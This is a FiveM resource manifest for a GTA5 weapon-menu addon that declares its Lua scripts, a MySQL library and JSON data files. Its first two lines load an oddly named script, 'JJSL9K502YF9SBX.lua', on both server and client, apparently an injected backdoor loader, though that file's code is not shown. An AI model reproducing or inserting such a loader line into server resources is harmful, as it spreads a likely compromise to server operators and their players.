server_script "JJSL9K502YF9SBX.lua"
client_script "JJSL9K502YF9SBX.lua"
fx_version 'cerulean'
games {'gta5'}
description 'markomods addon weapon menu'

server_scripts {
	'@mysql-async/lib/MySQL.lua',
	'./lua/server.lua'
}
client_scripts {
	'@menuv/menuv.lua',
	'./lua/main.lua'
}


file "./json/addonlist.json"
file "./json/defaultlist.json"